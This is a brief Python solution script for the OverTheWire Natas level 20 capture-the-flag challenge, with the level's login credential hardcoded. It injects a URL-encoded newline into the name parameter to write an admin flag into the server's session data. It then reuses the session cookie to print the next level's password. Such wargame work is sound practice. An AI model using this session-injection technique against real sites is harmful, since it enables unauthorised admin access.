#!/bin/python
import requests

url = "http://natas20.natas.labs.overthewire.org?debug"
auth = ("natas20", "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH")

uri = ''.join([url, '&name=admin%0Aadmin%201'])

r = requests.get(uri, auth=auth)

# print(r.text)

p = requests.post(url, auth=auth, params='name=admin', cookies=r.cookies)

# print(p.text)
for line in p.text.split("\n"):
    if "Password:" in line:
        print(line.strip())
